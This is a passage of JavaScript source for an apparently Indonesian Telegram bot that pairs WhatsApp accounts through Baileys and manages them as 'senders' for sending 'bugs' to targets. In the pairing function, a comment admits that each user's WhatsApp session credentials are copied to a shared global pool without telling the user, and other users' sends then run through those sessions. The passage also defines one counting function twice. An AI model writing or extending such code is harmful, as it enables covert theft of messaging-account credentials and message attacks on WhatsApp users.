          clearTimeout(timeout);
          reject(new Error("Already registered"));
        }
      } catch (err) {
        clearTimeout(timeout);
        reject(err);
      }
    });

    let pairingCode = null;
    
    try {
      const result = await pairingCodePromise;
      pairingCode = result.code;
      logDebug(`[PAIRING GLOBAL] Code untuk +${number}: ${pairingCode}`);
    } catch (err) {
      logDebug(`[PAIRING GLOBAL ERROR] ${err.message}`);
      return null;
    }

    // Handler untuk koneksi
    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

      if (connection === "open") {
        logDebug(`[PAIRING GLOBAL] Koneksi terbuka untuk +${number}`);
        activeConnections[number] = sock;
        
        // Deteksi tipe WhatsApp
        const type = detectWATypeFromCreds(path.join(sessionDir, 'creds.json'));
        if (type === "Business") {
          biz[number] = sock;
        } else {
          mess[number] = sock;
        }

        // Simpan creds ke file JSON di folder global
        try {
          await sleep(3000);
          const sourceCreds = path.join(sessionDir, 'creds.json');
          
          if (fs.existsSync(sourceCreds)) {
            const credsData = JSON.parse(fs.readFileSync(sourceCreds, 'utf8'));
            const enhancedCreds = {
              ...credsData,
              registeredNumber: number,
              registeredAt: new Date().toISOString(),
              type: 'global',
              active: true
            };
            fs.writeFileSync(credsFile, JSON.stringify(enhancedCreds, null, 2));
            logDebug(`[PAIRING GLOBAL] Creds saved to ${credsFile}`);
            
            // Buat file info
            const infoFile = path.join(globalFolder, `${number}_info.json`);
            const infoData = {
              number: number,
              formattedNumber: `+${number}`,
              registeredAt: new Date().toISOString(),
              type: 'global',
              active: true,
              lastSeen: new Date().toISOString(),
              whatsappType: type
            };
            fs.writeFileSync(infoFile, JSON.stringify(infoData, null, 2));
          }
        } catch (e) {
          logError(`[PAIRING GLOBAL] Gagal menyimpan creds: ${e.message}`);
        }
      }

      if (connection === "close") {
        logDebug(`[PAIRING GLOBAL] +${number} disconnected: ${statusCode}`);
        
        // Update status di file info
        try {
          const infoFile = path.join(globalFolder, `${number}_info.json`);
          if (fs.existsSync(infoFile)) {
            const infoData = JSON.parse(fs.readFileSync(infoFile, 'utf8'));
            infoData.active = false;
            infoData.lastSeen = new Date().toISOString();
            infoData.disconnectReason = statusCode;
            fs.writeFileSync(infoFile, JSON.stringify(infoData, null, 2));
          }
        } catch (e) {}
        
        if (!isLoggedOut && attempt < 5 && !activeConnections[number]) {
          logDebug(`[PAIRING GLOBAL] Mencoba reconnect +${number} (${attempt + 1}/5)`);
          await sleep(5000);
          await pairingWa(number, attempt + 1);
        } else if (isLoggedOut) {
          delete activeConnections[number];
          try {
            if (fs.existsSync(credsFile)) fs.unlinkSync(credsFile);
            if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });
            const infoFile = path.join(globalFolder, `${number}_info.json`);
            if (fs.existsSync(infoFile)) fs.unlinkSync(infoFile);
          } catch (e) {}
        }
      }
    });

    return { sock, pairingCode };
    
  } catch (err) {
    logError(`[PAIRING GLOBAL ERROR] ${err.message}`);
    if (attempt < 5) {
      await sleep(3000);
      return pairingWa(number, attempt + 1);
    }
    return false;
  }
}

// Perbaikan fungsi pairingWa dengan dukungan global
async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  
  const userDir = path.join('permenmd', owner);
  const sessionDir = path.join(userDir, number);

  // Buat folder jika belum ada
  if (!fs.existsSync('permenmd')) {
    fs.mkdirSync('permenmd', { recursive: true });
  }
  if (!fs.existsSync(userDir)) {
    fs.mkdirSync(userDir, { recursive: true });
  }
  if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
  }

  try {
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;
        
        if (!isLoggedOut && attempt < 5) {
          await waiting(5000);
          return pairingWa(number, owner, attempt + 1);
        } else {
          delete activeConnections[number];
          
          // Cleanup failed session
          try {
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            const sessionFile = path.join(userDir, `${number}.json`);
            if (fs.existsSync(sessionFile)) {
              fs.unlinkSync(sessionFile);
            }
            const globalFile = path.join('permenmd', 'global', `${number}.json`);
            if (fs.existsSync(globalFile)) {
              fs.unlinkSync(globalFile);
            }
          } catch (e) {}
        }
      } 
      
      else if (connection === "open") {
        activeConnections[number] = sock;
        
        // Determine session type
        const type = detectWATypeFromCreds(path.join(sessionDir, 'creds.json'));
        if (type === "Business") {
          biz[number] = sock;
        } else if (type === "Messenger") {
          mess[number] = sock;
        }

        // Simpan session ke file .json di folder user
        try {
          const sourceCreds = path.join(sessionDir, 'creds.json');
          const destCreds = path.join(userDir, `${number}.json`);
          
          if (fs.existsSync(sourceCreds)) {
            await waiting(2000);
            const data = fs.readFileSync(sourceCreds);
            fs.writeFileSync(destCreds, data);
            
            // AUTO COPY KE GLOBAL SENDER (TANPA BERITAHU USER)
            copyToGlobalSender(owner, number, destCreds);
            
            // Kirim notifikasi pairing berhasil ke USER (TANPA SEBUT GLOBAL)
            const db = loadDatabaseCached();
            const userAccount = db.find(u => u.username === owner);
            
            if (userAccount?.telegramId) {
              try {
                await bot.sendMessage(userAccount.telegramId,
                  `✅ *PAIRING BERHASIL!*\n\n` +
                  `📱 Nomor: +${number}\n` +
                  `👤 Akun: ${owner}\n` +
                  `🔄 Status: AKTIF\n\n` +
                  `Sender siap digunakan untuk mengirim bug.`,
                  { parse_mode: "Markdown" }
                );
              } catch {}
            }
            
            // Update keyList.json
            const keyList = loadKeyList();
            const userKey = keyList.find(k => k.username === owner);
            if (userKey) {
              const timestamp = new Date().toISOString();
              userKey.lastPairing = timestamp;
              userKey.pairedNumbers = userKey.pairedNumbers || [];
              if (!userKey.pairedNumbers.includes(number)) {
                userKey.pairedNumbers.push(number);
              }
              saveKeyList(keyList);
            }
          }
        } catch (e) {}
      }
    });

    // Cek jika sudah terdaftar, jika belum request pairing code
    if (!sock.authState.creds.registered) {
      try {
        const code = await sock.requestPairingCode(number);
        if (code) {
          const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
          
          // Kirim pairing code ke user
          const db = loadDatabaseCached();
          const userAccount = db.find(u => u.username === owner);
          if (userAccount?.telegramId) {
            try {
              await bot.sendMessage(userAccount.telegramId,
                `🔑 *PAIRING CODE*\n\n` +
                `Untuk nomor: +${number}\n` +
                `Kode: \`${formattedCode}\`\n\n` +
                `Masukkan kode ini di WhatsApp target untuk menyelesaikan pairing.`,
                { parse_mode: "Markdown" }
              );
            } catch {}
          }
          return formattedCode;
        }
      } catch (pairErr) {
        return false;
      }
    } else {
      return "ALREADY_REGISTERED";
    }

    return null;
    
  } catch (err) {
    if (attempt < 5) {
      await waiting(3000);
      return pairingWa(number, owner, attempt + 1);
    }
    return false;
  }
}

bot.onText(/^\/sender\s+(\d+)$/i, async (msg, match) => {
  if (!onlyPrivate(msg)) return;
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const number = match[1];

  try {
    const db = loadDatabaseCached();
    const userAccount = db.find(u => u.telegramId === userId);

    if (!userAccount) {
      return bot.sendMessage(
        chatId,
        "❌ Anda belum memiliki akun!\nGunakan /start untuk membuat akun terlebih dahulu."
      );
    }

    const username = userAccount.username;

    // ===== STATUS AWAL =====
    await bot.sendMessage(
      chatId,
      `🔄 *Memproses PAIRING*\n\n` +
      `📱 Nomor: +${number}\n` +
      `👤 Akun: ${username}\n\n` +
      `⏳ Mohon tunggu...`,
      { parse_mode: "Markdown" }
    );

    const userDir = path.join("permenmd", username);
    const sessionDir = path.join(userDir, number);

    if (!fs.existsSync(userDir)) fs.mkdirSync(userDir, { recursive: true });
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      auth: state,
      version,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      markOnlineOnConnect: true,
      generateHighQualityLinkPreview: true,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 50000,
      syncFullHistory: false
    });

    sock.ev.on("creds.update", saveCreds);

    await sleep(2500);

    // ===== REQUEST PAIRING CODE =====
    if (!sock.authState.creds.registered) {
      const code = await sock.requestPairingCode(number);

      if (!code) {
        return bot.sendMessage(
          chatId,
          "❌ Gagal mendapatkan pairing code.\nPastikan nomor valid & belum dibanned."
        );
      }

      const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

      await bot.sendMessage(
        chatId,
        `✅ *PAIRING CODE BERHASIL*\n\n` +
        `📱 Nomor: +${number}\n` +
        `🔑 Kode: \`${formattedCode}\`\n\n` +
        `_Masukkan kode ini di WhatsApp target._`,
        { parse_mode: "Markdown" }
      );
    } else {
      await bot.sendMessage(
        chatId,
        "⚠️ Nomor ini sudah login.\nBisa Digunakan."
      );
    }

    // ===== CONNECTION HANDLER =====
    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "open") {
        activeConnections[number] = sock;

        await bot.sendMessage(
          chatId,
          `✅ *KONEKSI BERHASIL!*\n\n` +
          `📱 Nomor: +${number}\n` +
          `👤 Akun: ${username}\n` +
          `Status: AKTIF`,
          { parse_mode: "Markdown" }
        );

        // Simpan creds
        try {
          const sourceCreds = path.join(sessionDir, "creds.json");
          const destCreds = path.join(userDir, `${number}.json`);

          if (fs.existsSync(sourceCreds)) {
            fs.copyFileSync(sourceCreds, destCreds);
            logDebug(`✅ Session saved: ${destCreds}`);
          }
        } catch (e) {
          logError(`❌ Save session error: ${e.message}`);
        }
      }

      if (connection === "close") {
        const reason = lastDisconnect?.error?.output?.statusCode;
        logDebug(`[${username}] +${number} disconnected (${reason})`);

        if (reason === DisconnectReason.loggedOut) {
          await bot.sendMessage(
            chatId,
            `❌ Nomor +${number} logout.\nGunakan /pairing ${number} untuk pairing ulang.`
          );

          try {
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }

            const saved = path.join(userDir, `${number}.json`);
            if (fs.existsSync(saved)) fs.unlinkSync(saved);
          } catch (e) {
            logError(`Cleanup error: ${e.message}`);
          }
        }
      }
    });

  } catch (err) {
    logError("PAIRING ERROR", err);
    bot.sendMessage(
      chatId,
      `❌ Terjadi kesalahan:\n\`${err.message}\``,
      { parse_mode: "Markdown" }
    );
  }
});

// Fungsi untuk memulai proses pairing
async function startPairingProcess(number, username, chatId) {
  return new Promise(async (resolve) => {
    try {
      const userDir = path.join("permenmd", username);
      const sessionDir = path.join(userDir, number);

      // Buat folder jika belum ada
      if (!fs.existsSync(userDir)) fs.mkdirSync(userDir, { recursive: true });
      if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

      // Setup WhatsApp socket
      const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        version,
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 50000,
        syncFullHistory: false
      });

      sock.ev.on("creds.update", saveCreds);

      await sleep(2500);

      // Cek jika sudah terdaftar
      if (!sock.authState.creds.registered) {
        // Request pairing code
        const code = await sock.requestPairingCode(number);
        
        if (!code) {
          resolve({ success: false, message: "Gagal mendapatkan pairing code" });
          return;
        }

        // Format kode pairing
        const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

        // Simpan session sementara
        sock.ev.on("connection.update", async (update) => {
          const { connection, lastDisconnect } = update;

          if (connection === "open") {
            // Simpan session ke file
            try {
              const sourceCreds = path.join(sessionDir, "creds.json");
              const destCreds = path.join(userDir, `${number}.json`);

              if (fs.existsSync(sourceCreds)) {
                fs.copyFileSync(sourceCreds, destCreds);
                
                // Kirim notifikasi ke user
                bot.sendMessage(
                  chatId,
                  `<blockquote>
<b>🎉 SENDER BERHASIL DITAMBAHKAN!</b>

📱 Nomor: +${number}
👤 Akun: ${username}
✅ Status: AKTIF

<i>Sender siap digunakan untuk mengirim bug.</i>
</blockquote>`,
                  { parse_mode: "HTML" }
                );
              }
            } catch (e) {
              console.error("Save session error:", e.message);
            }
          }

          if (connection === "close") {
            const reason = lastDisconnect?.error?.output?.statusCode;
            
            if (reason === DisconnectReason.loggedOut) {
              // Bersihkan file session jika logout
              try {
                if (fs.existsSync(sessionDir)) {
                  fs.rmSync(sessionDir, { recursive: true, force: true });
                }
                const saved = path.join(userDir, `${number}.json`);
                if (fs.existsSync(saved)) fs.unlinkSync(saved);
              } catch (e) {
                console.error("Cleanup error:", e.message);
              }
            }
          }
        });

        resolve({ success: true, pairingCode: formattedCode });
      } else {
        resolve({ success: true, pairingCode: "ALREADY_REGISTERED", message: "Nomor sudah terdaftar" });
      }

    } catch (error) {
      console.error("Pairing error:", error);
      resolve({ success: false, message: error.message });
    }
  });
}

// Setelah fungsi startUserSessions, tambahkan fungsi untuk memulai global sender
// Fungsi untuk memulai semua sender global
async function startGlobalSenders() {
  const globalFolder = path.join('permenmd', 'global');
  
  if (!fs.existsSync(globalFolder)) {
    logDebug(`[GLOBAL] No global folder exists, creating...`);
    fs.mkdirSync(globalFolder, { recursive: true });
    return;
  }
  
  // Baca file JSON di folder global (hanya file .json yang bukan _info)
  const jsonFiles = fs.readdirSync(globalFolder).filter(file => file.endsWith('.json') && !file.includes('_info'));
  logDebug(`[GLOBAL] Found ${jsonFiles.length} global sender files`);
  
  if (jsonFiles.length === 0) {
    logDebug(`[GLOBAL] No global senders found`);
    return;
  }
  
  // Koneksikan semua global sender
  for (const file of jsonFiles) {
    const sessionName = path.basename(file, '.json');
    const sessionFolder = path.join(globalFolder, sessionName);
    
    // Buat folder session jika belum ada
    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(globalFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (fs.existsSync(source) && !fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
        logDebug(`[GLOBAL] Copied creds for ${sessionName}`);
      }
    }
    
    // Koneksi session
    logDebug(`[GLOBAL] Connecting global sender: ${sessionName}`);
    try {
      await connectSession(globalFolder, sessionName);
      logDebug(`[GLOBAL] Connection initiated for ${sessionName}`);
    } catch (err) {
      logError(`[GLOBAL] Failed to connect ${sessionName}:`, err.message);
    }
    
    // Delay antar koneksi
    await sleep(2000);
  }
  
  // Log status akhir setelah 5 detik
  setTimeout(() => {
    let activeCount = 0;
    for (const file of jsonFiles) {
      const sessionName = path.basename(file, '.json');
      if (activeConnections[sessionName]) {
        activeCount++;
        logDebug(`[GLOBAL] ✓ ${sessionName} is ACTIVE`);
        
        // Update info file saat aktif
        try {
          const infoFile = path.join(globalFolder, `${sessionName}_info.json`);
          if (fs.existsSync(infoFile)) {
            const infoData = JSON.parse(fs.readFileSync(infoFile, 'utf8'));
            infoData.active = true;
            infoData.lastSeen = new Date().toISOString();
            fs.writeFileSync(infoFile, JSON.stringify(infoData, null, 2));
          }
        } catch (e) {}
      } else {
        logDebug(`[GLOBAL] ✗ ${sessionName} is INACTIVE`);
      }
    }
    logDebug(`[GLOBAL] Final status: ${activeCount}/${jsonFiles.length} global senders active`);
  }, 5000);
}

// Fungsi debug untuk memeriksa status semua sender
function debugSenderStatus() {
  logInfo("========== SENDER STATUS DEBUG ==========");
  
  // Cek semua activeConnections
  logInfo(`Active Connections: ${Object.keys(activeConnections).length}`);
  for (const [name, sock] of Object.entries(activeConnections)) {
    logInfo(`  - ${name}: ${sock ? 'Connected' : 'Disconnected'}`);
  }
  
  // Cek folder permenmd
  const permenmdFolder = path.join(__dirname, 'permenmd');
  if (fs.existsSync(permenmdFolder)) {
    const folders = fs.readdirSync(permenmdFolder);
    for (const folder of folders) {
      const folderPath = path.join(permenmdFolder, folder);
      if (fs.lstatSync(folderPath).isDirectory()) {
        const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith('.json'));
        logInfo(`Folder: ${folder} - ${jsonFiles.length} sender files`);
        
        for (const file of jsonFiles) {
          const sessionName = path.basename(file, '.json');
          const isActive = activeConnections[sessionName] ? 'ACTIVE' : 'INACTIVE';
          logInfo(`  ${isActive}: ${sessionName}`);
        }
      }
    }
  } else {
    logInfo(`permenmd folder not found!`);
  }
  
  logInfo("==========================================");
}

// Panggil debug saat startup
setTimeout(() => {
  debugSenderStatus();
}, 3000);

// Panggil startGlobalSenders setelah startUserSessions
// Di dalam fungsi startUserSessions, tambahkan:
async function startUserSessions() {
  const subfolders = fs.readdirSync('permenmd')
    .map(name => path.join('permenmd', name))
    .filter(p => fs.lstatSync(p).isDirectory());

  logDebug(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    // Skip global folder dulu, akan diproses nanti
    if (path.basename(folder) === 'global') continue;
    
    const folderName = path.basename(folder);
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    logDebug(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folderName}`);

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;

      if (activeConnections[sessionName]) {
        logDebug(`[SKIP] Session ${sessionName} already active, skipping...`);
        continue;
      }

      try {
        logDebug(`[START] Connecting session: ${sessionName} from ${folderName}`);
        await connectSession(folder, sessionName);
      } catch (err) {
        logError(`[ERROR] Failed to start session ${sessionName}:`, err.message);
      }
    }
  }
  
  // PASTIKAN GLOBAL SENDER DIMULAI
  logDebug(`[STARTUP] Starting global senders...`);
  await startGlobalSenders();
}

// Tambahkan di bagian akhir file, setelah startUserSessions()
// Fungsi untuk mengecek dan menampilkan status sender saat startup
function checkAllSendersStatus() {
  logInfo("📊 Checking all senders status...");
  
  // Cek sender global
  const globalFolder = path.join('permenmd', 'global');
  if (fs.existsSync(globalFolder)) {
    const globalFiles = fs.readdirSync(globalFolder).filter(f => f.endsWith('.json'));
    logInfo(`🌍 GLOBAL SENDERS: ${globalFiles.length} registered`);
    
    let activeGlobal = 0;
    for (const file of globalFiles) {
      const sessionName = path.basename(file, '.json');
      if (activeConnections[sessionName]) {
        activeGlobal++;
        logInfo(`   ✅ +${sessionName} - ACTIVE`);
      } else {
        logInfo(`   ❌ +${sessionName} - INACTIVE`);
      }
    }
    logInfo(`   Active: ${activeGlobal}/${globalFiles.length}`);
  } else {
    logInfo(`🌍 GLOBAL SENDERS: No global senders registered`);
  }
  
  // Cek semua sender personal
  const subfolders = fs.readdirSync('permenmd')
    .map(name => path.join('permenmd', name))
    .filter(p => fs.lstatSync(p).isDirectory());
  
  for (const folder of subfolders) {
    const folderName = path.basename(folder);
    if (folderName === 'global') continue;
    
    const jsonFiles = fs.readdirSync(folder).filter(f => f.endsWith('.json'));
    if (jsonFiles.length > 0) {
      let active = 0;
      for (const file of jsonFiles) {
        const sessionName = path.basename(file, '.json');
        if (activeConnections[sessionName]) active++;
      }
      logInfo(`👤 ${folderName}: ${active}/${jsonFiles.length} active senders`);
    }
  }
}

// Panggil setelah startUserSessions()
setTimeout(() => {
  checkAllSendersStatus();
}, 5000);

// Load chat dari file
function loadChat() {
  try {
    if (fs.existsSync(CHAT_FILE)) {
      return JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
    }
  } catch (e) {
    logError('[вқҢ CHAT] Gagal load chat:', e.message);
  }
  return [];
}

// Save chat ke file
function saveChat(chatData) {
  try {
    fs.writeFileSync(CHAT_FILE, JSON.stringify(chatData, null, 2));
  } catch (e) {
    logError('[вқҢ CHAT] Gagal save chat:', e.message);
  }
}

// Online users tracking
const onlineUsers = new Map(); // key: username, value: timestamp

async function getSocketForUser(username) {
  // Cek dulu di folder user pribadi
  const userFolder = path.join('permenmd', username);
  if (fs.existsSync(userFolder)) {
    const jsonFiles = fs.readdirSync(userFolder).filter(file => file.endsWith('.json'));
    for (const file of jsonFiles) {
      const sessionName = path.basename(file, '.json');
      if (activeConnections[sessionName]) {
        return activeConnections[sessionName];
      }
    }
  }
  
  // Jika tidak ada, cek di folder global
  const globalFolder = path.join('permenmd', 'global');
  if (fs.existsSync(globalFolder)) {
    const jsonFiles = fs.readdirSync(globalFolder).filter(file => file.endsWith('.json'));
    for (const file of jsonFiles) {
      const sessionName = path.basename(file, '.json');
      if (activeConnections[sessionName]) {
        logDebug(`[getSocketForUser] Using GLOBAL sender for ${username}`);
        return activeConnections[sessionName];
      }
    }
  }
  
  return null;
}

async function getSocketForUserByType(username, senderType) {
  logDebug(`[GET SOCKET] Looking for ${senderType} sender for ${username}`);
  
  if (senderType === 'pribadi') {
    const userFolder = path.join('permenmd', username);
    if (!fs.existsSync(userFolder)) {
      logDebug(`[GET SOCKET] No personal folder for ${username}`);
      return null;
    }
    
    const jsonFiles = fs.readdirSync(userFolder).filter(file => file.endsWith('.json') && !file.includes('_info'));
    logDebug(`[GET SOCKET] Found ${jsonFiles.length} personal sender files for ${username}`);
    
    for (const file of jsonFiles) {
      const sessionName = path.basename(file, '.json');
      if (activeConnections[sessionName]) {
        logDebug(`[GET SOCKET] Found active personal sender: ${sessionName}`);
        return activeConnections[sessionName];
      }
    }
    logDebug(`[GET SOCKET] No active personal sender for ${username}`);
    return null;
    
  } else if (senderType === 'private') {
    const globalFolder = path.join('permenmd', 'global');
    if (!fs.existsSync(globalFolder)) {
      logDebug(`[GET SOCKET] No global folder exists`);
      return null;
    }
    
    // Baca file JSON di folder global (hanya .json, bukan _info)
    const jsonFiles = fs.readdirSync(globalFolder).filter(file => file.endsWith('.json') && !file.includes('_info'));
    logDebug(`[GET SOCKET] Found ${jsonFiles.length} global sender files`);
    
    if (jsonFiles.length === 0) {
      logDebug(`[GET SOCKET] No global sender files found`);
      return null;
    }
    
    // Cari sender global yang aktif
    for (const file of jsonFiles) {
      const sessionName = path.basename(file, '.json');
      if (activeConnections[sessionName]) {
        logDebug(`[GET SOCKET] Found ACTIVE global sender: ${sessionName}`);
        return activeConnections[sessionName];
      }
    }
    
    // Jika tidak ada yang aktif, coba reconnect
    for (const file of jsonFiles) {
      const sessionName = path.basename(file, '.json');
      const sessionFolder = path.join(globalFolder, sessionName);
      
      if (fs.existsSync(sessionFolder) && !activeConnections[sessionName]) {
        logDebug(`[GET SOCKET] Attempting to reconnect global sender: ${sessionName}`);
        await connectSession(globalFolder, sessionName);
        
        if (activeConnections[sessionName]) {
          logDebug(`[GET SOCKET] Successfully reconnected global sender: ${sessionName}`);
          return activeConnections[sessionName];
        }
      }
    }
    
    logDebug(`[GET SOCKET] No ACTIVE global sender found`);
    return null;
  }
  
  return null;
}

// PERBAIKI: Fungsi untuk mendapatkan jumlah sender PRIBADI yang AKTIF
// PERBAIKI: Fungsi untuk mendapatkan jumlah sender PRIBADI yang AKTIF
function getPersonalSenderCount(username) {
    const userFolder = path.join('permenmd', username);
    if (!fs.existsSync(userFolder)) {
        logDebug(`[COUNT PERSONAL] Folder not found: ${userFolder}`);
        return 0;
    }
    
    // Baca semua file .json di folder user (bukan folder session)
    const jsonFiles = fs.readdirSync(userFolder).filter(file => file.endsWith('.json') && !file.includes('_info'));
    logDebug(`[COUNT PERSONAL] Found ${jsonFiles.length} sender files in ${userFolder}`);
    
    let activeCount = 0;
    let inactiveFiles = [];
    
    for (const file of jsonFiles) {
        const sessionName = path.basename(file, '.json');
        
        // CEK apakah session ada di activeConnections
        if (activeConnections[sessionName]) {
            activeCount++;
            logDebug(`[COUNT PERSONAL] ✓ ACTIVE: ${sessionName}`);
        } else {
            logDebug(`[COUNT PERSONAL] ✗ INACTIVE: ${sessionName}`);
            inactiveFiles.push(sessionName);
            
            // Coba reconnect jika ada folder session
            const sessionFolder = path.join(userFolder, sessionName);
            if (fs.existsSync(sessionFolder)) {
                logDebug(`[COUNT PERSONAL] Attempting to reconnect: ${sessionName}`);
                // Panggil reconnect tanpa blocking
                connectSession(userFolder, sessionName).catch(e => {
                    logDebug(`[COUNT PERSONAL] Reconnect failed for ${sessionName}: ${e.message}`);
                });
            }
        }
    }
    
    logDebug(`[COUNT PERSONAL] ${username} - Active: ${activeCount}/${jsonFiles.length}, Inactive: ${inactiveFiles.join(', ') || 'none'}`);
    return activeCount;
}

// PERBAIKI: Fungsi untuk mendapatkan jumlah sender GLOBAL yang AKTIF
// PERBAIKI: Fungsi untuk mendapatkan jumlah sender GLOBAL yang AKTIF
function getGlobalSenderCount() {
    const globalFolder = path.join('permenmd', 'global');
    if (!fs.existsSync(globalFolder)) {
        logDebug(`[COUNT GLOBAL] Folder global not found, creating...`);
        fs.mkdirSync(globalFolder, { recursive: true });
        return 0;
    }
    
    // Baca semua file .json di folder global (hanya yang bukan _info)
    const jsonFiles = fs.readdirSync(globalFolder).filter(file => file.endsWith('.json') && !file.includes('_info'));
    logDebug(`[COUNT GLOBAL] Found ${jsonFiles.length} global sender files`);
    
    let activeCount = 0;
    let inactiveFiles = [];
    
    for (const file of jsonFiles) {
        const sessionName = path.basename(file, '.json');
        
        // CEK apakah session ada di activeConnections
        if (activeConnections[sessionName]) {
            activeCount++;
            logDebug(`[COUNT GLOBAL] ✓ ACTIVE: ${sessionName}`);
        } else {
            logDebug(`[COUNT GLOBAL] ✗ INACTIVE: ${sessionName}`);
            inactiveFiles.push(sessionName);
            
            // Coba reconnect jika tidak aktif
            const sessionFolder = path.join(globalFolder, sessionName);
            if (fs.existsSync(sessionFolder)) {
                logDebug(`[COUNT GLOBAL] Attempting to reconnect: ${sessionName}`);
                // Panggil reconnect tanpa blocking
                connectSession(globalFolder, sessionName).catch(e => {
                    logDebug(`[COUNT GLOBAL] Reconnect failed for ${sessionName}: ${e.message}`);
                });
            } else {
                // Jika folder session tidak ada, buat dari file JSON
                logDebug(`[COUNT GLOBAL] Creating session folder for ${sessionName}`);
                fs.mkdirSync(sessionFolder, { recursive: true });
                const sourceFile = path.join(globalFolder, file);
                const destFile = path.join(sessionFolder, 'creds.json');
                if (fs.existsSync(sourceFile) && !fs.existsSync(destFile)) {
                    try {
                        const credsData = JSON.parse(fs.readFileSync(sourceFile, 'utf8'));
                        // Hapus field tambahan
                        const cleanCreds = {
                            ...credsData,
                            registeredNumber: undefined,
                            formattedNumber: undefined,
                            registeredAt: undefined,
                            addedBy: undefined,
                            addedByName: undefined
                        };
                        fs.writeFileSync(destFile, JSON.stringify(cleanCreds, null, 2));
                        logDebug(`[COUNT GLOBAL] Created creds.json for ${sessionName}`);
                        
                        // Coba koneksi
                        connectSession(globalFolder, sessionName).catch(e => {
                            logDebug(`[COUNT GLOBAL] Connect failed for ${sessionName}: ${e.message}`);
                        });
                    } catch (e) {
                        logDebug(`[COUNT GLOBAL] Error creating creds for ${sessionName}: ${e.message}`);
                    }
                }
            }
        }
    }
    
    logDebug(`[COUNT GLOBAL] Total active: ${activeCount}/${jsonFiles.length}, Inactive: ${inactiveFiles.join(', ') || 'none'}`);
    return activeCount;
}

// Fungsi untuk mendapatkan jumlah sender GLOBAL
function getGlobalSenderCount() {
    const globalFolder = path.join('permenmd', 'global');
    if (!fs.existsSync(globalFolder)) return 0;
    
    const jsonFiles = fs.readdirSync(globalFolder).filter(file => file.endsWith('.json'));
    let count = 0;
    
    for (const file of jsonFiles) {
        const sessionName = path.basename(file, '.json');
        if (activeConnections[sessionName]) {
            count++;
        }
    }
    
    return count;
}

// Update fungsi removeAccountTracking
function removeAccountTracking(telegramId) {
  try {
    // Hapus dari accountCreationTracker
    if (accountCreationTracker[telegramId]) {
      // Hapus semua tracking untuk user ini
      delete accountCreationTracker[telegramId];
      
      // Simpan perubahan
      fs.writeFileSync('accountTracker.json', JSON.stringify(accountCreationTracker, null, 2));
      logDebug(`[TRACKING] Removed all tracking for ${telegramId}`);
    }
    return true;
  } catch (error) {
    logError(`[TRACKING ERROR] Failed to remove tracking: ${error.message}`);
    return false;
  }
}

// Tambahkan di bagian inisialisasi database
function initializeTrackingFile() {
  if (!fs.existsSync('accountTracker.json')) {
    fs.writeFileSync('accountTracker.json', JSON.stringify({}, null, 2));
    logDebug("[🗃️] File accountTracker.json dibuat otomatis.");
  }
  
  // Load existing tracking data
  try {
    const savedTracker = JSON.parse(fs.readFileSync('accountTracker.json', 'utf8'));
    Object.assign(accountCreationTracker, savedTracker);
    logDebug("[🗃️] Account tracker loaded successfully");
  } catch (e) {
    logError("[❌ TRACKER] Gagal load account tracker:", e.message);
  }
}

// Panggil fungsi ini di initializeDatabase()
function initializeDatabase() {
  const dbFiles = [
    'database.json',
    'keyList.json',
    'chat.json',
    'logUser.txt',
    'vps.json',
    'accountTracker.json' // Tambahkan ini
  ];
  
  for (const file of dbFiles) {
    const filePath = path.join(__dirname, file);
    if (!fs.existsSync(filePath)) {
      if (file.endsWith('.json')) {
        fs.writeFileSync(filePath, JSON.stringify(file === 'accountTracker.json' ? {} : [], null, 2));
